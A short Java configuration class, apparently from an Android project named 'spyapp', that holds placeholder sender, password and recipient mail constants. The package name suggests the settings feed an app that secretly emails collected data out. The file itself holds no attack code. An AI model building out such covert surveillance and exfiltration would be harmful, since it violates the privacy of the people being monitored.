package com.rubik.spyapp_3.mail;

/**
 * Created by Rubik on 19/10/16.
 */

public class MailConfig {
    public static final String MAIL_FROM ="yourappMail@salgo.com";
    public static final String PASSWORD ="pass";

    public static final String MAIL_TO ="";
}
